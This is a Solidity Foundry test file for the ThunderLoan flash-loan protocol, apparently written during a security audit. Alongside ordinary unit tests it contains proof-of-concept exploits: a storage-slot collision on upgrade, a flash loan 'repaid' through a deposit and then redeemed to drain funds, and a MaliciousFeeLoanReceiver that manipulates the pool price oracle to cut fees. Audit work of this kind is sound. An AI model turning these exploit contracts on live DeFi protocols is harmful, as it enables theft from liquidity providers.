// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 50e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    // @audit - poc
    // poc for checking the storage slot of variables
    function teststorage_Slots() public {
        vm.startPrank(thunderLoan.owner());
        // before upgrade value of fee_precision
        uint256 feebeforeupgrade = thunderLoan.getFee() ; 
        // console.log("feePrecision is ",feePrecision);
        console.log("Before calling upgrades flashloanfee is",feebeforeupgrade);
        // after calling upgrades
        ThunderLoanUpgraded upgrades = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgrades) , "");
        uint256 feeafterupgrade = thunderLoan.getFee();
        console.log("After calling upgrades flashloanfee is",feeafterupgrade);
        vm.stopPrank();
        assert(feebeforeupgrade != feeafterupgrade);
        
     }

    // @audit - poc
    function testFlashLoanwithoutrepay() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amount_to_borrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA,amount_to_borrow);
        flash_loan_without_repay flr = new flash_loan_without_repay(address(thunderLoan));
        tokenA.mint(address(flr),fee);
        thunderLoan.flashloan(address(flr),tokenA,amount_to_borrow,"");
        flr.redeem();
        vm.stopPrank();
         assert(tokenA.balanceOf(address(flr)) > 50e18+fee);
        }
   
        // @audit -testcase POC checking for oracle manipulation
    function testOracleManipulation() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // fund tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool),100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool),100e18);
        BuffMockTSwap(tswapPool).deposit(100e18,100e18,100e18,block.timestamp);
        vm.stopPrank();
        // fund thunder loan
        vm.startPrank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA,true);
        vm.stopPrank();
        //fund
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider,100e18);
        tokenA.approve(address(thunderLoan),100e18);
        thunderLoan.deposit(tokenA,100e18);
        vm.stopPrank();

        uint256 normal_fee = thunderLoan.getCalculatedFee(tokenA,100e18);
        console.log("normal fee cost is" , normal_fee); // 296147410319118389
        uint256 amount_to_borrow = 50e18;
        MaliciousFeeLoanReceiver flr = new MaliciousFeeLoanReceiver(
            address(tswapPool),address(thunderLoan),
           address(thunderLoan.getAssetFromToken(tokenA)));
           vm.startPrank(user);
           tokenA.mint(address(flr),100e18);
           thunderLoan.flashloan(address(flr),tokenA,amount_to_borrow,"");
           vm.stopPrank();
           uint256 attackfee = flr.feeOne() + flr.feeTwo();
           console.log("attack fee is", attackfee); 
           console.log("reduced fee is ", normal_fee - attackfee);
        }
}
    contract MaliciousFeeLoanReceiver is IFlashLoanReceiver {
       ThunderLoan thunderLoan;
       address repayAddress;
       BuffMockTSwap tswapPool;
       bool attacked;
       uint256 public feeOne;
       uint256 public feeTwo;
    //    tokenA = new ERC20Mock();
       
       constructor(address _tswapPool,address _thunderLoan , address _repayAddress)
          {
            tswapPool = BuffMockTSwap(_tswapPool);
            thunderLoan = ThunderLoan(_thunderLoan);
            repayAddress = _repayAddress ; 
          }
          function executeOperation(
            address token,
            uint256 amount,
            uint256 fee,
            address /*initiator*/ ,
            bytes calldata /* params */
        ) external returns (bool) {
           if(!attacked){
              feeOne = fee;
              attacked = true;
              uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18 , 100e18 , 100e18);
              IERC20(token).approve(address(tswapPool),50e18);
              tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18 , wethBought , block.timestamp);
              thunderLoan.flashloan(address(this),IERC20(token),amount , "" );
            //   IERC20(token).approve(address(thunderLoan),amount+fee);
              IERC20(token).transfer(address(repayAddress) , amount+fee);
            //   thunderLoan.repay(IERC20(token) ,amount+fee);
            }
           else {
              feeTwo = fee; 
            //   IERC20(token).approve(address(thunderLoan),amount+fee);
            //   thunderLoan.repay(IERC20(token) ,amount+fee);
            IERC20(token).transfer(address(repayAddress) , amount+fee);
                 
           }
        }
    }

    contract flash_loan_without_repay is IFlashLoanReceiver {
        ThunderLoan thunderLoan;
        AssetToken assetToken;
        IERC20 token;
        constructor(address _thunderLoan)
           {
             thunderLoan = ThunderLoan(_thunderLoan);
            }
           function executeOperation(
             address _token,
             uint256 amount,
             uint256 fee,
             address /*initiator*/ ,
             bytes calldata /* params */
         ) external returns (bool) {
             token = IERC20(_token);
             assetToken = thunderLoan.getAssetFromToken(IERC20(_token));
             token.approve(address(thunderLoan),amount + fee);
             thunderLoan.deposit(IERC20(_token),amount+fee);
             return true;
            }
            function redeem() external {
                uint256 amount = assetToken.balanceOf(address(this));
                thunderLoan.redeem(token,amount);
            }
         } 
 
